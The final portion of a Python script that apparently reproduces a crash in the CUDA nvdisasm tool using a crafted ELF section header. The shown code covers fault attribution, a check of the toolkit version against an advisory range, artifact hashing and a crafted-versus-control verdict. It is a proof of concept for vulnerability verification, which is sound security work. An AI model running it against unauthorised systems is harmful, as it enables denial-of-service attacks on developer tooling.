        backtrace = capture_debugger_backtrace(state["tools"]["nvdisasm"], state["crafted"][0])
        if backtrace:
            print("[CUDA_INFO] debugger backtrace:\n%s" % backtrace)
        else:
            print("[CUDA_INFO] no debugger on PATH; attribution rests on the differential "
                  "(cuobjdump exits 0 on the very same bytes)")
    except Exception as exc:
        log_fail("S06", "Attribute the fault to the ELF section-header parser", str(exc))
        return False
    log_ok("S06", "Attribute the fault to the ELF section-header parser")
    return True


def step_s07(out_dir, state):
    """Classify the installed toolkit against the advisory range."""
    log_start("S07", "Classify the installed toolkit against the advisory range")
    try:
        version = state["env"]["toolkit"]
        verdict = classify_toolkit_version(version)
        state["verdict"] = verdict
        print("[CUDA_INFO] toolkit %s -> %s" % (version, verdict))
        for tool_name in ("cuobjdump", "nvdisasm"):
            path = state["tools"].get(tool_name)
            if path:
                report_tool_version(path)
    except Exception as exc:
        log_fail("S07", "Classify the installed toolkit against the advisory range", str(exc))
        return False
    log_ok("S07", "Classify the installed toolkit against the advisory range", state["verdict"])
    return True


def step_s08(out_dir, state):
    """Confirm reproducibility, hash every artifact and verify the manifest paths."""
    log_start("S08", "Confirm reproducibility and record the artifacts")
    try:
        codes = state.get("crafted_codes", [])[:RUN_REPETITIONS]
        reproducible = len(codes) == RUN_REPETITIONS and len(set(codes)) == 1
        print("[CUDA_INFO] crafted exit codes across repetitions: %s (reproducible=%s)"
              % (codes, reproducible))
        manifest_path = os.path.join(out_dir, "artifacts.json")
        if not os.path.isfile(manifest_path):
            raise RuntimeError("artifacts.json is missing")
        with open(manifest_path, "r", encoding="utf-8") as handle:
            manifest = json.load(handle)
        for role, names in manifest.items():
            for name in names:
                path = os.path.join(out_dir, name)
                if not os.path.isfile(path):
                    raise RuntimeError("declared %s artifact %s is missing" % (role, name))
                print("[CUDA_INFO] %-9s %s sha256=%s size=%d"
                      % (role, name, sha256_file(path), os.path.getsize(path)))
    except Exception as exc:
        log_fail("S08", "Confirm reproducibility and record the artifacts", str(exc))
        traceback.print_exc()
        return False
    log_ok("S08", "Confirm reproducibility and record the artifacts")
    return True


def finalize(state):
    """Emit the differential verdict and return the process exit status."""
    crafted = state.get("crafted_codes") or []
    control = state.get("control_codes") or []
    benign = state.get("benign_codes") or []
    crafted_crash = any(is_crash(code) for code in crafted)
    control_crash = any(is_crash(code) for code in control)
    benign_crash = any(is_crash(code) for code in benign)
    print("[CUDA_VERDICT] benign_crash=%s crafted_crash=%s control_crash=%s"
          % (benign_crash, crafted_crash, control_crash))
    if not state.get("tools"):
        print("[CUDA_VERDICT] FAIL: environment setup never completed")
        return 2
    if benign_crash or not benign:
        print("[CUDA_VERDICT] FAIL: the benign baseline did not run cleanly, "
              "so no differential exists")
        return 2
    if crafted_crash and not control_crash:
        print("[CUDA_VERDICT] SUCCESS: the crafted section header faults nvdisasm "
              "and the restored control does not")
        return 0
    if crafted_crash and control_crash:
        print("[CUDA_VERDICT] INVALID: both crafted and control fault, evidence is void")
        return 3
    print("[CUDA_VERDICT] NOT REPRODUCED: no crafted artifact faulted on this host")
    return 1


def main():
    """Execute every strategy step in order and return the process exit code."""
    print_banner()
    out_dir = script_dir()
    print("[CUDA_INFO] output directory: %s" % out_dir)
    sys.stdout.flush()
    state = {}
    steps = (step_s01, step_s02, step_s03, step_s04,
             step_s05, step_s06, step_s07, step_s08)
    for step in steps:
        try:
            if not step(out_dir, state):
                print("[CUDA_INFO] %s stopped the remaining pipeline" % step.__name__)
                break
        except Exception:
            print("[CUDA_INFO] unhandled exception in %s" % step.__name__)
            traceback.print_exc()
            break
    exit_code = finalize(state)
    cleanup_cuda()
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
